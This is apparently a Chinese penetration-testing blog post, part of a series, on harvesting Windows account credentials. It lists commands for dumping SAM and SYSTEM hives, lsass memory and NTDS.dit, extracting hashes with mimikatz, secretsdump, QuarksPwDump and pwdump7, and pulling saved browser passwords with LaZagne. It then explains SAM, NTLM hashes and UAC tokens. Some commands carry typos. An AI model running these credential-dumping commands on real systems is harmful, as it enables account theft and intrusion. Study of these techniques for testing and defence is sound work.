# 内网渗透-Windows凭据收集之系统账号密码(9)

  
  
&lt;!--more--&gt;  
## 收集方法  
### 提取SAM数据库的hash  
使用`reg`命令保存注册表键  
```  
reg save hklm\sam c:\sam.hive  
reg save hklm\system c:\system.hive  
```  
### 使用Invoke-NinjaCopy  
```  
Import-Module \invoke\ninjacopy.ps1  
Invoke-NinjaCopy-Path C:\sam.hive  
Invoke-NinjaCopy-Path C:\system.hive  
```  
读取hive文件  
```  
mimikatz.exe &#34;lsadump::sam /system:system.hive /sam:sam.hive&#34; exit  
python secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL  
```  
### procdump.exe  
`procdump.exe -ma lsass.exe lsass.dmp`  
获取到内存转储文件后，就可以使用mimikatz来提取密码  
```  
sekurlsa::minidump lsass.dmp  
sekurlsa::logonpasswords  
```  
### createdump.exe  
```  
createdmp.exe -u -f lsass.dmp lsass进程PID号  
查询进程号: tasklist | find &#34;lsass&#34;  
```  
### Get-PassHashes.ps1  
```  
..\GetPassHashes.ps1  
GetPassHashes  
```  
### netpass  
直接运行  
https://www.secpulse.com/archives/tag/QuarksPwDump  
```  
参数解释  
-dhl 导出本地哈希值  
-dhdc 导出内存中的域控哈希值  
-dhd  导致域控哈希值，必须制定NTDS文件  
-db 导出Bitlocker信息，必须指定NTDS文件  
-nt 导出ntds文件  
-hist 导出历史信息，可选项  
-t 导出类型可选默认导出为John类型。  
-o 导出文件到本地  
```  
```  
QuarksPwDump.exe -dhl -o 1.txt \\将导出本地哈希值到当前目录的1.txt  
配合ntdutil工具导出域控密码  
ntdsutil snapshot &#34;active instance ntds&#34; create quit quit  
QuarkPwDump.exe --dmp-hash-domain --ntds0file c:\ntds.dit  
```  
### pwdump7  
`Pwddump7.exe &gt; pass.txt \\读取出hash保存到pass.txt`  
### LaZagne  
```  
laZagne.exe all \\启动所有模块  
laZagne.exe browsers \\启动特定模块  
laZagne.exe browsers -firefox \\抓去特定一个软件的密码，比如抓去火狐  
laZagne.exe all -oN \\-oN表示普通txt  
```  
## Windows账户  
`Windows`用户的密码加密后一般有两种形式:`NTML Hash`和`LM Hash`（从windows Vista和2008开始，微软就取消了LMHash）  
对于域用户，则存储在域控制器的NTDS.dit数据库中(域控NTDS数据库：%SystemRoot%\NTDS)  
### SAM  
本地SAM数据库(安全账户管理器)`%SystemRoot%/system32/config/SAM`，且挂载于`HKLM/SAM`。  
sam文件：用来存储本地用户账号密码的文件的数据库`使用syskey解密HKLM\SAM`  
system文件：用来sam文件进行加密和解密的密钥`读取HKLM\SYSTEM，获得syskey`  
### UAC`[全称是User Account Control(账号控制器)]`  
当我们右键某个可执行文件，选择以管理员身份运行，就会弹出一个对话框，依据当前用户权限的不同，可能是要求我们输入管理员凭据，也可能是询问我们是否允许该程序进行更改。这其实就是UAC。  
ACL(Access Control List)：Windows中所有资源都有ACL，这个列表决定了拥有何种权限的用户/进程能够使用这个资源  
	在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 Access Token。如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。  
经常提到的hash传递失败，有文章解释是kb281997补丁的问题，实际上是UAC的更新的问题。  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E4%B9%8B%E7%B3%BB%E7%BB%9F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%819/  

